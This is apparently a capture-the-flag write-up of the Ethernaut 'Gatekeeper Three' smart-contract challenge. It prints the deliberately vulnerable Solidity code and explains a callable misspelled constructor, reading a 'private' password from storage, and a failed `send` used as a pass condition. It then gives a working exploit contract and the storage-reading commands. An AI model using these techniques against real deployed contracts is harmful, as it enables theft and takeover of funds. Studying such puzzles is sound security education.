---
title: "Ethernaut 28 Gatekeeper Three"
description: "Ethernaut 28 Gatekeeper Three writeup"
---

## Challenge
### Prompt
Cope with gates and become an entrant.
Things that might help:
Recall return values of low-level functions.
Be attentive with semantic.
Refresh how storage works in Ethereum.
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```
## Background

---

Before Solidity 0.4.22, a function with the same name as the contract could serve as the constructor. Now the `constructor` keyword is used, so `construct0r` is just a public function.
It does not run automatically on deployment and anyone can call it, so `owner` can be overwritten later.

---

`private` only prevents other contracts from accessing a value directly at the Solidity level; it does not hide the value stored on-chain. A contract's storage is public per slot and can be read with an RPC such as `eth_getStorageAt`.
`SimpleTrick`'s state variables are stored in order.
1. `target`: slot 0
2. `trick`: slot 1
3. `password`: slot 2

After creating `SimpleTrick` with `createTrick()`, obtain the `trick` address and read that contract's slot 2 to learn the `password`.

---

`send` does not revert the whole transaction when the ETH transfer fails; it returns `false` instead. `gateThree` uses this failure as its pass condition.
If the attack contract is the `owner` and has no `receive` or payable fallback, it cannot receive ETH and `payable(owner).send(0.001 ether)` fails.

---

ETH can be forced into a contract even if it has no `receive()`. Here we create a separate contract and call `selfdestruct` in its constructor to send the balance to `GatekeeperThree`.
Even after Cancun, when a contract being created is `selfdestruct`ed within the same transaction, the balance transfer is possible. In this challenge we only need to satisfy the `address(this).balance > 0.001 ether` condition.
## Analyzing the challenge code

---

First, `construct0r` and `gateOne`:
```solidity
function construct0r() public {
    owner = msg.sender;
}

modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```
`construct0r` has the digit `0` instead of the letter `o`, so it is a public function anyone can call.
`gateOne` requires `msg.sender == owner` while `tx.origin != owner`. If an EOA calls `enter()` directly, `msg.sender` and `tx.origin` are the same and the check fails. So we make the attack contract the `owner`, and then have the EOA call `enter()` through the attack contract.

---

Next, `createTrick` and `password`:
```solidity
function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
}

function getAllowance(uint256 _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
}
```
`gateTwo` requires `allowEntrance == true`, and this value is only changed in `getAllowance()`. The problem is that `getAllowance()` must pass `SimpleTrick.checkPassword()`.
`password` is `private` but is still stored in storage slot 2. Reading the slots at the `trick` address gives:
```javascript
await contract.createTrick()
await contract.trick()
'0xd21E19b406fc956392AcF8415D41fbAE6655bD6a'

await web3.eth.getStorageAt('0xd21E19b406fc956392AcF8415D41fbAE6655bD6a', 0)
'0x00000000000000000000000071bcb6eaa9db7fffde06e152454fd954eff79b00'
await web3.eth.getStorageAt('0xd21E19b406fc956392AcF8415D41fbAE6655bD6a', 1)
'0x000000000000000000000000d21e19b406fc956392acf8415d41fbae6655bd6a'
await web3.eth.getStorageAt('0xd21E19b406fc956392AcF8415D41fbAE6655bD6a', 2)
'0x00000000000000000000000000000000000000000000000000000000692e9ca4'
```
Slot 0 and slot 1 are address values, and slot 2's `0x692e9ca4` is the `password`. Passing this value as a `uint256` sets `allowEntrance` to `true`.

---

Finally, the failure condition of `gateThree`:
```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```
If the condition is not met, the function body is skipped without a revert. So to change `entrant` we must satisfy both conditions.
For the first condition, we put more than `0.001 ether` of ETH into `GatekeeperThree`. A normal transfer works too, but to match the hint we force it with `selfdestruct`.
For the second condition, the `send` of `0.001 ether` to `owner` must return `false`. By making the attack contract the `owner` and giving it no ETH-receiving function, this transfer fails.
## Solution
There are three conditions to pass.
1. `owner` is the attack contract, and the `enter()` call must go through the attack contract.
2. Read `password` from `SimpleTrick`'s slot 2 and call `getAllowance(password)`.
3. `GatekeeperThree` must have more than `0.001 ether` of ETH, and the `send` to `owner` must fail.

First call `createTrick()` to create `SimpleTrick`, check its address with `trick()`, then read slot 2. Then, from the attack contract, call `construct0r()`, `getAllowance(password)`, and `enter()` in order.
`createTrick()` stays outside the attack function because we need to read storage in between to learn the `password`.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function getAllowance(uint256 _password) external;
    function createTrick() external;
    function enter() external;
    function construct0r() external;
}

contract Selfdestruct {
    constructor(address _addr) payable {
        selfdestruct(payable(_addr));
    }
}

contract Attack {
    IGatekeeperThree gatekeeperthree;

    constructor(address _addr) {
        gatekeeperthree = IGatekeeperThree(_addr);
    }

    function forceFund() external payable {
        new Selfdestruct{value: msg.value}(address(gatekeeperthree));
    }

    function attack(uint256 _password) public {
        gatekeeperthree.construct0r();
        gatekeeperthree.getAllowance(_password);
        gatekeeperthree.enter();
    }
}
```
![screenshot](./image-1.png)
